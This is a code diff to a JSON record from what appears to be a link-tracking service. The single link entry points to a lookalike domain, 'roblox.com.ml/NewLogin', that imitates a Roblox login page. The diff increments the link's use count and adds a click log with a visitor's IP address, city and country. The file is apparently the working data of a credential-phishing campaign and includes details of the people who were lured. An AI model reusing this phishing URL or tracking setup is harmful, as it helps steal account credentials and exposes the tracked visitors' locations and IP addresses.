@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 519,
+    "useCount": 520,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4264,6 +4264,14 @@
         "city": "Haiphong",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777087923092,
+        "ip": "38.253.149.65",
+        "country": "Peru",
+        "city": "San Isidro",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
